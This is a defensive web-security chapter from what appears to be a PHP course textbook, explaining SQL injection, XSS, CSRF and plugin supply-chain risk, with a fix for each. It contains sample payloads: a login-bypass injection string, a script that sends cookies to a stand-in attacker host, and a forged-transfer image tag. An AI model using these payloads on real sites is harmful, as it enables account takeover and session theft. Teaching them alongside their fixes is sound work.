## Vulnerabilities in Custom Code {#sec-09-custom-code-en}

The most widely used reference for classifying web application vulnerabilities is the `OWASP Top 10`, a list of the most critical security risks, maintained by the *Open Worldwide Application Security Project* and periodically updated based on the analysis of tens of thousands of real vulnerabilities [@owasp_top10_2025]. Three of these vulnerabilities are particularly relevant to a PHP application like the ones developed in this course:

### SQL Injection {#sec-09-sql-injection-en}

SQL Injection occurs when data supplied by the user is inserted directly into an SQL statement, allowing an attacker to change the meaning of that statement. Consider a login form implemented insecurely, through direct concatenation:

```php
<?php
$utilizador = $_POST["utilizador"];
$password = $_POST["password"];

$sql = "SELECT * FROM utilizadores WHERE utilizador = '$utilizador' "
     . "AND password = '$password'";
$resultado = $conexao->query($sql);
```

If an attacker enters, in the `utilizador` field, the text `' OR '1'='1' -- `, the SQL statement actually executed becomes:

```sql
SELECT * FROM utilizadores
WHERE utilizador = '' OR '1'='1' -- ' AND password = '...'
```

Since `'1'='1'` is always true, and `--` turns the rest of the line into an SQL comment, ignoring the password check, this query returns the first user in the table, allowing the attacker to log in without knowing any valid password. It is avoided by always using *prepared statements*, as seen in @sec-08-prepared-statements-en, which treat the content of `$_POST` always as a value, never as part of the SQL command, regardless of what that value contains.

### XSS (Cross-Site Scripting) {#sec-09-xss-en}

XSS occurs when data supplied by a user is displayed to other users without being properly handled, allowing an attacker to inject JavaScript code that runs in the *browser* of whoever views that page. Consider a comment box that displays the submitted text directly:

```php
<?php
echo "<p>" . $_POST["comentario"] . "</p>";
```

If an attacker submits, as a comment, the text `<script>document.location='http://atacante.com/roubo?c='+document.cookie</script>`, that JavaScript code becomes part of the page like any other, and is automatically executed in the *browser* of any other user who visits that page, potentially, for example, sending their session *cookies* to a server controlled by the attacker. It is avoided by always escaping user-generated content before displaying it in HTML, with the `htmlspecialchars()` function, which converts special HTML characters, such as `<` and `>`, into their harmless equivalents:

```php
<?php
echo "<p>" . htmlspecialchars($_POST["comentario"]) . "</p>";
```

This way, the attacker's text is shown literally on the page, as visible text, and is not interpreted as code.

### CSRF (Cross-Site Request Forgery) {#sec-09-csrf-en}

CSRF occurs when an attacker tricks the *browser* of an already-authenticated user into sending, without the user noticing, a request to an application where they have an active session, exploiting the fact that the *browser* automatically sends session *cookies* on any request to that domain, as seen in @sec-07-cookies-en. Imagine a banking application with a transfer implemented as a simple `GET` request:

```
GET /transferir?destino=1234&valor=500
```

If a user, authenticated with that bank, visits, in another *browser* tab, a malicious page containing `<img src="https://banco.com/transferir?destino=1234&valor=500">`, the *browser* tries to load that "image", automatically sending the request to the bank, along with the user's valid session *cookie*, without the user having clicked anything. It is avoided in two complementary ways: never implement operations that change data as a simple `GET`, as already recommended in @sec-07-get-vs-post-en, and include, in every sensitive form, a unique, unpredictable token, generated by the server and verified before processing the request, which a malicious page, hosted on another domain, has no way of knowing or reproducing.

In all these cases, the underlying principle is the same: never trust data coming from the client, whether from a form, a URL parameter or a *cookie*, without first validating and handling it properly.

## Vulnerabilities in Third-Party Dependencies {#sec-09-dependencies-en}

The attack surface of a website is not limited to the code written directly by its programmer. Much of today's Web is built on content management systems, such as `WordPress`, extended through third-party *plugins*, often developed by small teams or even a single independent programmer. According to Patchstack's 2025 security report, 91% of the vulnerabilities found in the WordPress ecosystem that year were located in *plugins*, not in the `WordPress` core, and more than half of the recorded infections resulted from outdated *plugins* [@patchstack_2025_report].

This reality led the most recent update of the OWASP Top 10 to introduce a category dedicated to failures in the software supply chain (*Software Supply Chain Failures*), recognising that an application's security also depends on the security of every library, *framework* and extension it relies on, not just the code written by the team itself [@owasp_top10_2025]. This is why, in practice, hosting providers sometimes suspend access to a website until its vulnerable dependencies are updated: the vulnerability may not be in a single line of code written by the site's owner, but the risk it represents is just as real.

## Best Practices {#sec-09-best-practices-en}

A few simple practices significantly reduce the security risk of a web application:

- **Regular updates**: keep the underlying *software* (PHP itself, the web server, the database management system) and all third-party dependencies and extensions updated to the latest version, since many vulnerabilities are only exploited after they become publicly known;
- **Principle of least privilege**: every component of an application, and every database user, should have only the permissions strictly necessary for its function, never full access for convenience;
- **Data validation and sanitisation**: always treat any data coming from outside the application with suspicion, validating its format and sanitising its content before using it, whether in a database query or on a page shown to another user.
